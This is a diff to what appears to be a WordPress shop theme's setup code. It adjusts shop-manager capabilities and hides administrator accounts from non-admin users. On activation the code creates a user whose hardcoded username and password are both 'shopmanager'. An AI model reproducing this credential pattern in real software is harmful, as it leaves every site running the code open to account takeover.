@@ -23,6 +23,10 @@ License: ZSMP
 			}
 		}
 		
+		$role = get_role('shop_manager');
+		
+		$role->add_cap('create_users');
+		
 		//add new page
 		if (isset($_GET['activated']) && is_admin()){
 			$new_page_title = 'Manager Login';
@@ -49,9 +53,9 @@ License: ZSMP
 			update_option( 'show_on_front', 'page' );
 			
 			function add_new_user_account(){
-				$username = 'shopmanager2';
+				$username = 'shopmanager';
 				$password = 'shopmanager';
-				$email = 'info@nmgresources.ph';
+				$email = 'info@zurpay.com';
 				
 				if(!username_exists($username) && !email_exists($email)){
 					$user_id = wp_create_user($username, $password, $email);
@@ -90,32 +94,10 @@ License: ZSMP
 		}
 		add_action('admin_menu', 'new_prod_menu');
 	
-		//Remove unecessary user roles
-		$role = get_role('shop_manager');
-		$role->add_cap('switch_themes'); //add new role switch theme capabilities
-		$role->add_cap('edit_theme_options');
-		$role->remove_cap('update_themes');
-		$role->remove_cap('edit_themes');
-		$role->add_cap('add_users');
-		$role->add_cap('edit_users');
-		$role->add_cap('delete_users');
-		$role->add_cap('list_users');
-		$role->add_cap('update_core');
-		$role->add_cap('manage_options');
-		$role->remove_cap('edit_others_pages');
-		$role->remove_cap('edit_others_posts');
-		$role->remove_cap('delete_others_pages');
-		$role->remove_cap('delete_others_posts');
-		$role->remove_cap('publish_posts');
-		$role->remove_cap('publish_pages');
-		$role->remove_cap('delete_posts');
-		$role->remove_cap('delete_pages');
+	
 		
-		
-		//hides admin users on user lists
-		
-		add_action('pre_user_query','shop_manager_pre_user_query');
-		function shop_manager_pre_user_query($user_search) {
+		add_action('pre_user_query','site_pre_user_query');
+		function site_pre_user_query($user_search) {
 			$user = wp_get_current_user();
 		
 			if ( $user->roles[0] != 'administrator' ) { 
@@ -129,9 +111,69 @@ License: ZSMP
 							AND wp_usermeta.meta_value = 0)", 
 					$user_search->query_where
 				);
-		
+				
 			}
 		}
+		
+			/* remove administrator roles on the selection */
+		class Rev_User_Caps {
+
+		  // Add our filters
+		  function Rev_User_Caps(){
+			add_filter( 'editable_roles', array(&$this, 'editable_roles'));
+			add_filter( 'map_meta_cap', array(&$this, 'map_meta_cap'),10,4);
+		  }
+		
+		  // Remove 'Administrator' from the list of roles if the current user is not an admin
+		  function editable_roles( $roles ){
+			if( isset( $roles['administrator'] ) && !current_user_can('administrator') ){
+			  unset( $roles['administrator']);
+			  unset ($roles['contributor']);
+			  unset ($roles['editor']);
+			  unset ($roles['author']);
+			  unset ($roles['subscriber']);
+			}
+			return $roles;
+		  }
+		
+		  // If someone is trying to edit or delete and admin and that user isn't an admin, don't allow it
+		  function map_meta_cap( $caps, $cap, $user_id, $args ){
+		
+			switch( $cap ){
+				case 'edit_user':
+				case 'remove_user':
+				case 'promote_user':
+					if( isset($args[0]) && $args[0] == $user_id )
+						break;
+					elseif( !isset($args[0]) )
+						$caps[] = 'do_not_allow';
+					$other = new WP_User( absint($args[0]) );
+					if( $other->has_cap( 'administrator' ) ){
+						if(!current_user_can('administrator')){
+							$caps[] = 'do_not_allow';
+						}
+					}
+					break;
+				case 'delete_user':
+				case 'delete_users':
+					if( !isset($args[0]) )
+						break;
+					$other = new WP_User( absint($args[0]) );
+					if( $other->has_cap( 'administrator' ) ){
+						if(!current_user_can('administrator')){
+							$caps[] = 'do_not_allow';
+						}
+					}
+					break;
+				default:
+					break;
+			}
+			return $caps;
+		  }
+		
+		}
+		
+		$the_user_caps = new Rev_User_Caps();
 		
 		
 		//Remove Sub-Menu items
